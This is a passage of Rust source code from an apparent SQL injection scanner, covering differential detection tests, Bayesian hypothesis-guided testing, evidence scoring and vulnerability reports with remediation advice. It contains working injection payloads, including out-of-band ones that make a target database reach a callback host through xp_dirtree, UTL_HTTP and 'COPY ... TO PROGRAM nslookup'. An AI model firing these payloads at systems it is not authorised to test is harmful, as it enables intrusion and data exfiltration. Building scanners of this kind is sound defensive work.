                if self.calculate_similarity(baseline, &mult_resp) > similarity_threshold {
                    info!("[SQLi] MULTIPLICATION INJECTION CONFIRMED: {}*1 = {}", num_value, num_value);
                    vulnerabilities.push(self.create_vulnerability(
                        base_url,
                        parameter,
                        &mult_payload,
                        "Arithmetic SQL Injection",
                        "Database evaluates multiplication in parameter",
                        Severity::High,
                        Confidence::High,
                    ));
                    return Ok((vulnerabilities, tests_run));
                }
            }
        }

        // ============================================================
        // TEST 2: Quote cancellation (requires differential analysis)
        // True SQLi: value' causes error, value'' works normally
        // False positive: both value' and value'' return same as baseline
        // ============================================================
        let single_quote_payload = format!("{}'", current_value);
        let double_quote_payload = format!("{}''", current_value);
        let single_quote_url = Self::build_test_url(base_url, parameter, &single_quote_payload);
        let double_quote_url = Self::build_test_url(base_url, parameter, &double_quote_payload);

        let single_quote_resp = self.http_client.get(&single_quote_url).await.ok();
        tests_run += 1;
        let double_quote_resp = self.http_client.get(&double_quote_url).await.ok();
        tests_run += 1;

        if let (Some(single_resp), Some(double_resp)) = (single_quote_resp, double_quote_resp) {
            let single_similarity = self.calculate_similarity(baseline, &single_resp);
            let double_similarity = self.calculate_similarity(baseline, &double_resp);

            // SQLi confirmed ONLY if:
            // 1. Single quote BREAKS the query (low similarity to baseline AND shows SQL error patterns)
            // 2. Double quote WORKS (high similarity to baseline)
            // This differential proves quotes are being parsed in SQL context
            //
            // IMPORTANT: Simple string matches like "sql" or "query" cause false positives
            // on forum/blog pages that discuss databases. Only match ACTUAL SQL error patterns.
            let body_lower = single_resp.body.to_lowercase();
            let has_sql_error = Self::detect_sql_error_patterns(&body_lower);

            let single_quote_breaks = (single_similarity < 0.7 && has_sql_error)
                || single_resp.status_code >= 500;

            let double_quote_works = double_similarity > similarity_threshold;

            if single_quote_breaks && double_quote_works {
                info!("[SQLi] QUOTE CANCELLATION CONFIRMED: {}' breaks, {}'' works (differential proof)", current_value, current_value);
                vulnerabilities.push(self.create_vulnerability(
                    base_url,
                    parameter,
                    &double_quote_payload,
                    "Quote Cancellation SQL Injection",
                    "Single quote breaks query, double quote escapes - proves SQL string context",
                    Severity::High,
                    Confidence::High,
                ));
                return Ok((vulnerabilities, tests_run));
            }
        }

        // ============================================================
        // TEST 3: Comment injection (REQUIRES differential proof)
        // TRUE SQLi: value' breaks, value'-- fixes it (comment suppresses error)
        // FALSE POSITIVE: value' and value'-- both work (XSS reflection, no SQL)
        // ============================================================
        // First, verify that single quote alone causes a CHANGE (proves SQL context)
        let single_quote_for_comment = format!("{}'", current_value);
        let single_quote_url_comment = Self::build_test_url(base_url, parameter, &single_quote_for_comment);
        let single_quote_resp_comment = self.http_client.get(&single_quote_url_comment).await.ok();
        tests_run += 1;

        // Check if single quote causes SQL-specific behavior (not just any change)
        let (single_quote_differs, has_sql_indicators) = single_quote_resp_comment
            .as_ref()
            .map(|r| {
                let body_lower = r.body.to_lowercase();
                let has_sql_error = Self::detect_sql_error_patterns(&body_lower);
                let has_db_error_code = r.status_code == 500 || r.status_code == 503;
                let sim = self.calculate_similarity(baseline, r);

                // Check for SQL-specific response changes (not just any content change)
                let sql_indicators = has_sql_error
                    || has_db_error_code
                    || body_lower.contains("syntax")
                    || body_lower.contains("error in your sql")
                    || body_lower.contains("unclosed quotation")
                    || body_lower.contains("unterminated string")
                    || body_lower.contains("invalid query");

                // Require EITHER SQL error indicators OR significant similarity drop with 500 error
                let differs = sql_indicators || (sim < 0.7 && has_db_error_code);
                (differs, sql_indicators)
            })
            .unwrap_or((false, false));

        // Only test comments if single quote causes SQL-specific behavior
        // This eliminates false positives on XSS/static sites where quote just gets reflected
        if single_quote_differs {
            debug!("[SQLi] Quote caused SQL indicators (has_sql_indicators={}), testing comments", has_sql_indicators);
            for (comment, db_hint) in [("'--", "Generic/MSSQL"), ("'#", "MySQL"), ("'-- -", "MySQL/MariaDB")] {
                let comment_payload = format!("{}{}", current_value, comment);
                let comment_url = Self::build_test_url(base_url, parameter, &comment_payload);
                if let Ok(comment_resp) = self.http_client.get(&comment_url).await {
                    tests_run += 1;

                    // Check for literal reflection (XSS, not SQLi)
                    let payload_reflected = comment_resp.body.contains(comment)
                        || comment_resp.body.contains(&comment.replace("'", "&#39;"))
                        || comment_resp.body.contains(&comment.replace("'", "&apos;"));

                    if payload_reflected {
                        debug!("[SQLi] Skipping comment injection - payload reflected in response (likely XSS)");
                        continue;
                    }

                    let comment_similarity = self.calculate_similarity(baseline, &comment_resp);

                    // SQLi confirmed: comment FIXES the broken query (returns to baseline)
                    // AND single quote alone BREAKS the query (differential proof)
                    if comment_similarity > similarity_threshold {
                        info!("[SQLi] COMMENT INJECTION CONFIRMED: {}' breaks, {}{} fixes ({})",
                              current_value, current_value, comment, db_hint);
                        vulnerabilities.push(self.create_vulnerability(
                            base_url,
                            parameter,
                            &comment_payload,
                            "Comment Injection SQL Injection",
                            &format!("SQL comment {} terminates query: quote breaks it, comment fixes it", comment),
                            Severity::High,
                            Confidence::High,
                        ));
                        return Ok((vulnerabilities, tests_run));
                    }
                }
            }
        } else {
            debug!("[SQLi] Skipping comment injection - no SQL error indicators from single quote (likely not SQL context)");
        }

        // ============================================================
        // TEST 4: String concatenation (database-specific)
        // If 'adm'||'in' returns same as 'admin', concat works
        // ============================================================
        if current_value.len() >= 2 {
            let mid = current_value.len() / 2;
            let first_half = &current_value[..mid];
            let second_half = &current_value[mid..];

            // Oracle/PostgreSQL: ||
            let concat_oracle = format!("{}'{}'||'{}", first_half, "'", second_half);
            // MSSQL: +
            let concat_mssql = format!("{}'+'{}",first_half, second_half);
            // MySQL: CONCAT or space
            let concat_mysql = format!("{}' '{}", first_half, second_half);

            for (payload, db_type) in [(concat_oracle, "Oracle/PostgreSQL"), (concat_mssql, "MSSQL"), (concat_mysql, "MySQL")] {
                let concat_url = Self::build_test_url(base_url, parameter, &payload);
                if let Ok(concat_resp) = self.http_client.get(&concat_url).await {
                    tests_run += 1;

                    if self.calculate_similarity(baseline, &concat_resp) > similarity_threshold {
                        info!("[SQLi] STRING CONCATENATION CONFIRMED: {} concat works ({})", payload, db_type);
                        vulnerabilities.push(self.create_vulnerability(
                            base_url,
                            parameter,
                            &payload,
                            "String Concatenation SQL Injection",
                            &format!("{} string concatenation successful", db_type),
                            Severity::High,
                            Confidence::High,
                        ));
                        return Ok((vulnerabilities, tests_run));
                    }
                }
            }
        }

        // ============================================================
        // TEST 5: Boolean differential
        // If 'AND 1=1' differs from 'AND 1=2', boolean injection works
        // ============================================================
        let true_payload = format!("{} AND 1=1", current_value);
        let false_payload = format!("{} AND 1=2", current_value);

        let true_url = Self::build_test_url(base_url, parameter, &true_payload);
        let false_url = Self::build_test_url(base_url, parameter, &false_payload);

        if let (Ok(true_resp), Ok(false_resp)) = (
            self.http_client.get(&true_url).await,
            self.http_client.get(&false_url).await,
        ) {
            tests_run += 2;

            let true_baseline_sim = self.calculate_similarity(baseline, &true_resp);
            let false_baseline_sim = self.calculate_similarity(baseline, &false_resp);
            let true_false_sim = self.calculate_similarity(&true_resp, &false_resp);

            // True should match baseline, False should differ, and they should differ from each other
            if true_baseline_sim > similarity_threshold
                && false_baseline_sim < 0.7
                && true_false_sim < 0.7
            {
                info!("[SQLi] BOOLEAN DIFFERENTIAL CONFIRMED: AND 1=1 ≠ AND 1=2");
                vulnerabilities.push(self.create_vulnerability(
                    base_url,
                    parameter,
                    &true_payload,
                    "Boolean-based SQL Injection",
                    "AND 1=1 and AND 1=2 produce different responses",
                    Severity::High,
                    Confidence::High,
                ));
                return Ok((vulnerabilities, tests_run));
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// OOBZero Inference Engine for blind SQLi detection
    ///
    /// Uses multi-channel Bayesian inference to detect blind vulnerabilities
    /// WITHOUT requiring external callback servers.
    ///
    /// Combines:
    /// - Boolean differential (AND 1=1 vs AND 1=2)
    /// - Arithmetic evaluation (7-1 = 6)
    /// - Quote oscillation pattern
    /// - Timing/length/entropy analysis
    /// - Negative evidence (no change = reduces confidence)
    async fn scan_oobzero_inference(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();

        info!(
            "[OOBZero] Running inference engine for '{}' parameter",
            parameter
        );

        // Create the side-channel analyzer
        let analyzer = SideChannelAnalyzer::new(Arc::clone(&self.http_client));

        // Run comprehensive side-channel analysis
        let result = analyzer.analyze_sqli(base_url, parameter, baseline).await;

        // The analyzer makes ~15-20 requests across all tests
        let tests_run = 18; // Approximate: 6 resonance + 6 boolean + 6 arithmetic

        // Log the inference result
        info!(
            "[OOBZero] Result for '{}': P={:.1}% confidence={} classes={} signals={}",
            parameter,
            result.combined.probability * 100.0,
            result.combined.confidence,
            result.combined.independent_classes,
            result.combined.signals_used
        );

        // Check if we have a confirmed or high-confidence finding
        if result.is_confirmed() {
            info!(
                "[OOBZero] CONFIRMED blind SQLi: {} (P={:.1}%, {} independent classes)",
                parameter,
                result.combined.probability * 100.0,
                result.combined.independent_classes
            );
            vulnerabilities.push(self.create_vulnerability(
                base_url,
                parameter,
                "[OOBZero multi-signal detection]",
                "Blind SQL Injection (OOBZero Confirmed)",
                &format!(
                    "Multi-channel Bayesian inference detected blind SQLi with {:.1}% confidence across {} independent signal classes. {}",
                    result.combined.probability * 100.0,
                    result.combined.independent_classes,
                    result.summary()
                ),
                Severity::Critical,
                Confidence::High,  // types::Confidence doesn't have Confirmed
            ));
        } else if result.is_likely_vulnerable() {
            // High probability but not fully confirmed
            let confidence = match result.combined.confidence {
                InferenceConfidence::High => Confidence::High,
                InferenceConfidence::Medium => Confidence::Medium,
                _ => Confidence::Low,
            };

            info!(
                "[OOBZero] Likely blind SQLi: {} (P={:.1}%, confidence={})",
                parameter,
                result.combined.probability * 100.0,
                result.combined.confidence
            );
            vulnerabilities.push(self.create_vulnerability(
                base_url,
                parameter,
                "[OOBZero inference detection]",
                "Potential Blind SQL Injection (OOBZero)",
                &format!(
                    "Probabilistic inference suggests blind SQLi with {:.1}% confidence. {}",
                    result.combined.probability * 100.0,
                    result.summary()
                ),
                Severity::High,
                confidence,
            ));
        } else {
            debug!(
                "[OOBZero] No SQLi detected for '{}': P={:.1}%",
                parameter,
                result.combined.probability * 100.0
            );
        }

        Ok((vulnerabilities, tests_run))
    }

    /// OUT-OF-BAND SQL Injection detection
    /// Uses DNS/HTTP callbacks to detect blind SQLi
    async fn scan_oob_injection(
        &self,
        base_url: &str,
        parameter: &str,
        oob_domain: Option<&str>,
        _config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        // If no OOB domain configured, skip
        let callback_domain = match oob_domain {
            Some(d) => d,
            None => return Ok((vulnerabilities, tests_run)),
        };

        // Generate unique token for this test
        let token = uuid::Uuid::new_v4().to_string().replace("-", "")[..12].to_string();
        let callback_url = format!("{}.{}", token, callback_domain);

        // OOB payloads for different databases
        let oob_payloads = vec![
            // MySQL - DNS exfiltration via LOAD_FILE
            (format!("' AND LOAD_FILE('\\\\\\\\{}\\\\a')-- ", callback_url), "MySQL LOAD_FILE"),
            // MySQL - DNS via SELECT INTO OUTFILE
            (format!("' UNION SELECT 1 INTO OUTFILE '\\\\\\\\{}\\\\a'-- ", callback_url), "MySQL OUTFILE"),
            // MSSQL - xp_dirtree for DNS
            (format!("'; EXEC master..xp_dirtree '\\\\{}\\a'-- ", callback_url), "MSSQL xp_dirtree"),
            // MSSQL - xp_fileexist
            (format!("'; EXEC master..xp_fileexist '\\\\{}\\a'-- ", callback_url), "MSSQL xp_fileexist"),
            // PostgreSQL - COPY for DNS
            (format!("'; COPY (SELECT '') TO PROGRAM 'nslookup {}'-- ", callback_url), "PostgreSQL COPY"),
            // Oracle - UTL_HTTP
            (format!("' AND UTL_HTTP.REQUEST('http://{}/')=1-- ", callback_url), "Oracle UTL_HTTP"),
            // Oracle - UTL_INADDR
            (format!("' AND UTL_INADDR.GET_HOST_ADDRESS('{}')=1-- ", callback_url), "Oracle UTL_INADDR"),
        ];

        for (payload, technique) in oob_payloads {
            let test_url = Self::build_test_url(base_url, parameter, &payload);

            // Send the payload (we don't care about the response)
            let _ = self.http_client.get(&test_url).await;
            tests_run += 1;

            debug!("[SQLi-OOB] Sent {} payload, callback token: {}", technique, token);
        }

        // Note: In a real implementation, we would:
        // 1. Wait a few seconds
        // 2. Query our callback server for the token
        // 3. If token was received, SQLi is confirmed
        //
        // For now, we just inject the payloads. The callback server
        // would need to be polled separately.

        info!("[SQLi-OOB] Injected {} OOB payloads with token: {}", tests_run, token);
        info!("[SQLi-OOB] Check callback server for hits on: {}", callback_url);

        Ok((vulnerabilities, tests_run))
    }

    /// Create a vulnerability report
    fn create_vulnerability(
        &self,
        url: &str,
        parameter: &str,
        payload: &str,
        vuln_type: &str,
        description: &str,
        severity: Severity,
        confidence: Confidence,
    ) -> Vulnerability {
        let cvss_score = match severity {
            Severity::Critical => 9.8,
            Severity::High => 8.6,
            Severity::Medium => 6.5,
            Severity::Low => 3.5,
            Severity::Info => 0.0,
        };
        Vulnerability {
            id: format!("sqli_{}_{}", vuln_type.to_lowercase().replace(" ", "_"), Self::generate_id()),
            vuln_type: vuln_type.to_string(),
            severity,
            confidence,
            category: "SQL Injection".to_string(),
            url: url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!("{}: {} in parameter '{}'", vuln_type, description, parameter),
            evidence: Some(description.to_string()),
            cwe: "CWE-89".to_string(),
            cvss: cvss_score,
            verified: true,
            false_positive: false,
            remediation: "Use parameterized queries or prepared statements. Never concatenate user input into SQL queries.".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
            ml_data: None,
        }
    }

    /// Bayesian hypothesis-guided SQL injection testing
    /// Uses the HypothesisEngine to intelligently prioritize tests based on evidence
    async fn scan_hypothesis_guided(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
        hypothesis_engine: &mut HypothesisEngine,
        config: &ScanConfig,
    ) -> Result<(Vec<Vulnerability>, usize)> {
        debug!(
            "[SQLi] Starting Bayesian hypothesis-guided testing for parameter '{}'",
            parameter
        );

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;
        let max_iterations = match config.scan_mode.as_str() {
            "insane" => 50,
            "thorough" => 30,
            _ => 15,
        };

        // Find SQL injection hypothesis
        let sqli_hypothesis_id = hypothesis_engine
            .get_active_hypotheses()
            .iter()
            .find(|h| matches!(h.hypothesis_type, HypothesisType::SqlInjection { .. }))
            .map(|h| h.id.clone());

        let Some(hypothesis_id) = sqli_hypothesis_id else {
            debug!("[SQLi] No SQLi hypothesis generated - skipping hypothesis-guided testing");
            return Ok((vulnerabilities, tests_run));
        };

        // Hypothesis-guided testing loop
        for iteration in 0..max_iterations {
            // Get current best hypothesis state
            let best_hypothesis = match hypothesis_engine.get_hypothesis(&hypothesis_id) {
                Some(h) => h.clone(),
                None => break,
            };

            // Check if hypothesis has been resolved
            if matches!(
                best_hypothesis.status,
                HypothesisStatus::Confirmed | HypothesisStatus::Rejected
            ) {
                debug!(
                    "[SQLi] Hypothesis {} resolved: {:?} (p={:.3})",
                    hypothesis_id, best_hypothesis.status, best_hypothesis.posterior_probability
                );
                break;
            }

            // Check probability thresholds
            if best_hypothesis.posterior_probability < 0.1 {
                debug!(
                    "[SQLi] Hypothesis probability too low ({:.3}) - rejecting",
                    best_hypothesis.posterior_probability
                );
                hypothesis_engine.resolve_hypothesis(&hypothesis_id, false);
                break;
            }

            if best_hypothesis.posterior_probability > 0.9 {
                debug!(
                    "[SQLi] Hypothesis probability high ({:.3}) - confirming",
                    best_hypothesis.posterior_probability
                );
                hypothesis_engine.resolve_hypothesis(&hypothesis_id, true);

                // Create vulnerability from confirmed hypothesis
                let vuln = self.create_vulnerability_from_hypothesis(
                    base_url,
                    parameter,
                    &best_hypothesis,
                    baseline,
                );
                if self.is_new_vulnerability(&vuln) {
                    info!(
                        "[SQLi] Bayesian-confirmed SQL injection in '{}' (p={:.3}, {} tests)",
                        parameter, best_hypothesis.posterior_probability, tests_run
                    );
                    vulnerabilities.push(vuln);
                }
                break;
            }

            // Get next test from hypothesis engine
            let test = match hypothesis_engine.get_next_test(&hypothesis_id) {
                Some(t) => t,
                None => {
                    debug!("[SQLi] No more tests available for hypothesis");
                    break;
                }
            };

            // Execute the test
            let test_url = if base_url.contains('?') {
                format!(
                    "{}&{}={}",
                    base_url,
                    parameter,
                    urlencoding::encode(&test.payload)
                )
            } else {
                format!(
                    "{}?{}={}",
                    base_url,
                    parameter,
                    urlencoding::encode(&test.payload)
                )
            };

            tests_run += 1;

            let response = match self.http_client.get(&test_url).await {
                Ok(resp) => resp,
                Err(e) => {
                    debug!("[SQLi] Hypothesis test request failed: {}", e);
                    // Network errors are weak negative evidence
                    let evidence = Evidence::new(
                        EvidenceType::BehaviorChange,
                        format!("Request failed: {}", e),
                        0.5, // Neutral-ish
                    )
                    .with_payload(&test.payload);
                    hypothesis_engine.update_with_evidence(&hypothesis_id, evidence);
                    continue;
                }
            };

            // Analyze response and create evidence
            let evidence = self.analyze_response_for_evidence(
                &response,
                baseline,
                &test.payload,
                &test.expected_evidence,
            );

            debug!(
                "[SQLi] Test {}: payload='{}', evidence={:?}, LR={:.2}",
                iteration + 1,
                &test.payload[..test.payload.len().min(30)],
                evidence.evidence_type,
                evidence.likelihood_ratio
            );

            // Update hypothesis with evidence
            hypothesis_engine.update_with_evidence(&hypothesis_id, evidence);

            // Check if we found a clear vulnerability during testing
            if let Some(vuln) =
                self.detector
                    .detect_sqli(&test_url, parameter, &test.payload, &response, baseline)
            {
                // Strong positive evidence - update hypothesis significantly
                let strong_evidence = Evidence::new(
                    EvidenceType::ExploitSuccess,
                    format!("SQLi detected by detector: {}", vuln.vuln_type),
                    15.0, // Very strong evidence
                )
                .with_payload(&test.payload);
                hypothesis_engine.update_with_evidence(&hypothesis_id, strong_evidence);

                if self.is_new_vulnerability(&vuln) {
                    info!(
                        "[SQLi] Vulnerability detected during hypothesis testing: {}",
                        vuln.vuln_type
                    );
                    vulnerabilities.push(vuln);

                    // Confirm hypothesis
                    hypothesis_engine.resolve_hypothesis(&hypothesis_id, true);
                    break;
                }
            }

            // Early exit in fast mode if we have high confidence
            if config.scan_mode.as_str() == "fast" && best_hypothesis.posterior_probability > 0.7 {
                debug!(
                    "[SQLi] Fast mode: probability sufficient ({:.3})",
                    best_hypothesis.posterior_probability
                );
                break;
            }
        }

        // Log final hypothesis state
        if let Some(final_hyp) = hypothesis_engine.get_hypothesis(&hypothesis_id) {
            let stats = hypothesis_engine.get_stats();
            debug!(
                "[SQLi] Hypothesis-guided testing complete: {} tests, final p={:.3}, status={:?}, {} total evidence",
                tests_run,
                final_hyp.posterior_probability,
                final_hyp.status,
                final_hyp.evidence.len()
            );
            debug!(
                "[SQLi] Engine stats: {} total, {} active, {} confirmed, {} rejected",
                stats.total, stats.active, stats.confirmed, stats.rejected
            );
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Analyze HTTP response to create evidence for hypothesis update
    fn analyze_response_for_evidence(
        &self,
        response: &HttpResponse,
        baseline: &HttpResponse,
        payload: &str,
        expected_evidence: &EvidenceType,
    ) -> Evidence {
        let body_lower = response.body.to_lowercase();

        // Check for SQL error messages (very strong evidence)
        let sql_error_patterns = [
            ("mysql", 12.0),
            ("mariadb", 12.0),
            ("postgresql", 12.0),
            ("pg_query", 10.0),
            ("sqlite", 10.0),
            ("sql syntax", 15.0),
            ("syntax error", 8.0),
            ("ora-", 12.0),
            ("microsoft sql", 12.0),
            ("mssql", 10.0),
            ("sqlstate", 10.0),
            ("unknown column", 8.0),
            ("mysql_fetch", 10.0),
            ("mysqli", 8.0),
            ("column not found", 8.0),
            ("wrong number of columns", 8.0),
            ("unclosed quotation mark", 10.0),
            ("quoted string not properly terminated", 10.0),
        ];

        for (pattern, likelihood_ratio) in sql_error_patterns {
            if body_lower.contains(pattern) && !baseline.body.to_lowercase().contains(pattern) {
                return Evidence::new(
                    EvidenceType::ErrorMessage,
                    format!("SQL error pattern detected: '{}'", pattern),
                    likelihood_ratio,
                )
                .with_payload(payload);
            }
        }

        // Check for status code changes
        if response.status_code == 500 && baseline.status_code != 500 {
            return Evidence::new(
                EvidenceType::StatusCodeChange,
                format!("Server error (500) triggered by payload"),
                5.0, // Moderately strong evidence
            )
            .with_payload(payload);
        }

        if response.status_code == 400 && baseline.status_code != 400 {
            return Evidence::new(
                EvidenceType::StatusCodeChange,
                "Bad request (400) triggered by payload".to_string(),
                3.0,
            )
            .with_payload(payload);
        }

        // Check for timing anomalies (for time-based tests)
        let timing_diff = response.duration_ms as i64 - baseline.duration_ms as i64;
        if timing_diff > 4000 {
            return Evidence::new(
                EvidenceType::TimingAnomaly,
                format!(
                    "Significant delay: {}ms (baseline: {}ms)",
                    response.duration_ms, baseline.duration_ms
                ),
                10.0, // Strong evidence for time-based injection
            )
            .with_payload(payload);
        } else if timing_diff > 2000 {
            return Evidence::new(
                EvidenceType::TimingAnomaly,
                format!(
                    "Moderate delay: {}ms (baseline: {}ms)",
                    response.duration_ms, baseline.duration_ms
                ),
                4.0,
            )
            .with_payload(payload);
        }

        // Check for significant response length changes
        let len_diff = (response.body.len() as i64 - baseline.body.len() as i64).abs();
        let baseline_len = baseline.body.len() as f64;
        if baseline_len > 0.0 {
            let change_ratio = len_diff as f64 / baseline_len;
            if change_ratio > 0.5 {
                return Evidence::new(
                    EvidenceType::LengthAnomaly,
                    format!(
                        "Significant response length change: {} bytes ({}% change)",
                        len_diff,
                        (change_ratio * 100.0) as i32
                    ),
                    2.5,
                )
                .with_payload(payload);
            }
        }

        // Check for WAF/filter detection
        let waf_patterns = [
            "blocked",
            "forbidden",
            "access denied",
            "not allowed",
            "waf",
            "firewall",
        ];
        for pattern in waf_patterns {
            if body_lower.contains(pattern) && !baseline.body.to_lowercase().contains(pattern) {
                return Evidence::new(
                    EvidenceType::WafDetected,
                    format!("Possible WAF/filter detected: '{}'", pattern),
                    0.3, // WAF presence is negative evidence for exploitability
                )
                .with_payload(payload);
            }
        }

        // Check for input reflection (weak positive evidence)
        if response.body.contains(payload) && !baseline.body.contains(payload) {
            return Evidence::new(
                EvidenceType::ContentReflection,
                "Payload reflected in response".to_string(),
                1.5, // Weak positive evidence
            )
            .with_payload(payload);
        }

        // Check for behavior change based on expected evidence type
        if *expected_evidence == EvidenceType::BehaviorChange {
            let similarity = self.calculate_similarity(baseline, response);
            if similarity < 0.5 {
                return Evidence::new(
                    EvidenceType::BehaviorChange,
                    format!(
                        "Significant behavior change (similarity: {:.1}%)",
                        similarity * 100.0
                    ),
                    2.0,
                )
                .with_payload(payload);
            }
        }

        // Default: no significant change detected (weak negative evidence)
        Evidence::new(
            EvidenceType::BehaviorChange,
            "No significant change detected".to_string(),
            0.7, // Slightly below 1.0 - weak negative evidence
        )
        .with_payload(payload)
    }

    /// Create a vulnerability from a confirmed hypothesis
    fn create_vulnerability_from_hypothesis(
        &self,
        url: &str,
        parameter: &str,
        hypothesis: &Hypothesis,
        baseline: &HttpResponse,
    ) -> Vulnerability {
        let db_type = match &hypothesis.hypothesis_type {
            HypothesisType::SqlInjection { db_type: Some(db) } => format!("{:?}", db),
            _ => "Unknown".to_string(),
        };

        // Collect evidence summary
        let evidence_summary: Vec<String> = hypothesis
            .evidence
            .iter()
            .map(|e| {
                format!(
                    "- {:?}: {} (LR: {:.2})",
                    e.evidence_type, e.observation, e.likelihood_ratio
                )
            })
            .collect();

        let evidence_text = format!(
            "Bayesian hypothesis testing confirmed SQL injection:\n\
            - Prior probability: {:.3}\n\
            - Final probability: {:.3}\n\
            - Evidence count: {}\n\
            - Database type: {}\n\n\
            Evidence collected:\n{}",
            hypothesis.prior_probability,
            hypothesis.posterior_probability,
            hypothesis.evidence.len(),
            db_type,
            evidence_summary.join("\n")
        );

        // Determine confidence based on posterior probability
        let confidence = if hypothesis.posterior_probability > 0.95 {
            Confidence::High
        } else if hypothesis.posterior_probability > 0.85 {
            Confidence::Medium
        } else {
            Confidence::Low
        };

        // Determine severity based on evidence quality
        // CRITICAL requires actual database errors or successful data extraction
        // HIGH for behavioral evidence only (quote cancellation, timing differences)
        let has_error_evidence = hypothesis
            .evidence
            .iter()
            .any(|e| matches!(e.evidence_type, EvidenceType::ErrorMessage));

        let has_exploit_success = hypothesis
            .evidence
            .iter()
            .any(|e| matches!(e.evidence_type, EvidenceType::ExploitSuccess));

        let severity = if has_error_evidence || has_exploit_success {
            Severity::Critical  // Confirmed with database errors or successful exploitation
        } else if hypothesis.posterior_probability > 0.90 {
            Severity::High  // High confidence but only behavioral evidence
        } else {
            Severity::Medium  // Lower confidence, behavioral evidence only
        };

        // Calculate CVSS score based on severity
        let cvss = match severity {
            Severity::Critical => 9.8,
            Severity::High => 8.6,
            Severity::Medium => 6.5,
            Severity::Low => 3.5,
            Severity::Info => 0.0,
        };

        // Get the most impactful payload used
        let payload = hypothesis
            .evidence
            .iter()
            .filter(|e| e.likelihood_ratio > 5.0)
            .filter_map(|e| e.test_payload.clone())
            .next()
            .unwrap_or_else(|| "Bayesian inference".to_string());

        Vulnerability {
            id: format!("sqli_hypothesis_{}", Self::generate_id()),
            vuln_type: "Bayesian-Confirmed SQL Injection".to_string(),
            severity,
            confidence,
            category: "Injection".to_string(),
            url: url.to_string(),
            parameter: Some(parameter.to_string()),
            payload,
            description: format!(
                "SQL injection vulnerability confirmed through Bayesian hypothesis testing. \
                Parameter '{}' is injectable with {:.1}% confidence based on {} pieces of evidence. \
                Database type: {}.",
                parameter,
                hypothesis.posterior_probability * 100.0,
                hypothesis.evidence.len(),
                db_type
            ),
            evidence: Some(evidence_text),
            cwe: "CWE-89".to_string(),
            cvss,
            verified: has_error_evidence || has_exploit_success,
            false_positive: false,
            remediation: "1. Use parameterized queries (prepared statements) exclusively\n\
                          2. Implement strict input validation and sanitization\n\
                          3. Apply principle of least privilege to database accounts\n\
                          4. Use ORM with built-in SQL injection protection\n\
                          5. Enable WAF rules for SQL injection detection\n\
                          6. Monitor and log database queries for anomalies".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
            ml_data: None,
        }.with_ml_data(baseline, None, None)
    }

    /// Check if vulnerability is new (thread-safe deduplication)
    fn is_new_vulnerability(&self, vuln: &Vulnerability) -> bool {
        let signature = format!(
            "{}:{}:{}",
            vuln.url,
            vuln.parameter.as_ref().unwrap_or(&String::new()),
            vuln.vuln_type
        );

        let mut confirmed = match self.confirmed_vulns.lock() {
            Ok(guard) => guard,
            Err(poisoned) => poisoned.into_inner(),
        };
        confirmed.insert(signature)
    }

    /// Generate unique ID
    fn generate_id() -> String {
        use rand::Rng;
        let mut rng = rand::rng();
        format!(
            "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
            rng.random::<u32>(),
            rng.random::<u16>(),
            rng.random::<u16>(),
            rng.random::<u16>(),
            rng.random::<u64>() & 0xffffffffffff
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_database_detection() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let client = Arc::new(HttpClient::new(10, 3).unwrap());
            let scanner = EnhancedSqliScanner::new(client);

            let mysql_response = HttpResponse {
                status_code: 200,
                body: "MySQL error: syntax error".to_string(),
                headers: HashMap::new(),
                duration_ms: 100,
            };

            let db_type = scanner.detect_database_type(&mysql_response).await;
            assert_eq!(db_type, DatabaseType::MySQL);
        });
    }

    #[test]
    fn test_context_detection() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let client = Arc::new(HttpClient::new(10, 3).unwrap());
            let scanner = EnhancedSqliScanner::new(client);

            let baseline = HttpResponse {
                status_code: 200,
                body: String::new(),
                headers: HashMap::new(),
                duration_ms: 100,
            };

            let context = scanner
                .detect_injection_context("http://example.com?id=123", "id", &baseline)
                .await;
            assert_eq!(context, InjectionContext::Numeric);
        });
    }

    #[test]
    fn test_content_similarity() {
        let client = Arc::new(HttpClient::new(10, 3).unwrap());
        let scanner = EnhancedSqliScanner::new(client);

        assert_eq!(scanner.calculate_content_similarity("hello", "hello"), 1.0);

        let sim = scanner.calculate_content_similarity("abc", "xyz");
        assert!(sim < 0.5);
    }

    #[test]
    fn test_context_priority_boost() {
        let client = Arc::new(HttpClient::new(10, 3).unwrap());
        let scanner = EnhancedSqliScanner::new(client);

        // Test with URL query string parameter (should get priority boost)
        let context_high_priority = ScanContext {
            parameter_source: ParameterSource::UrlQueryString,
            endpoint_type: EndpointType::RestApi,
            detected_tech: vec![],
            framework: None,
            server: None,
            other_parameters: vec![],
            is_json_api: false,
            is_graphql: false,
            form_fields: vec![],
            content_type: None,
        };
        let boost = scanner.get_context_priority_boost(Some(&context_high_priority));
        assert_eq!(boost, 3); // 2 for UrlQueryString + 1 for RestApi

        // Test with no context
        let boost_none = scanner.get_context_priority_boost(None);
        assert_eq!(boost_none, 0);
    }

    #[test]
    fn test_framework_specific_payloads() {
        let client = Arc::new(HttpClient::new(10, 3).unwrap());
        let scanner = EnhancedSqliScanner::new(client);

        // Test Django framework
        let django_context = ScanContext {
            parameter_source: ParameterSource::UrlQueryString,
            endpoint_type: EndpointType::RestApi,
            detected_tech: vec!["Django".to_string()],
            framework: Some("Django".to_string()),
            server: None,
            other_parameters: vec![],
            is_json_api: false,
            is_graphql: false,
            form_fields: vec![],
            content_type: None,
        };
        let payloads =
            scanner.get_framework_specific_payloads(&django_context, &InjectionContext::String);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("auth_user")));

        // Test Laravel framework
        let laravel_context = ScanContext {
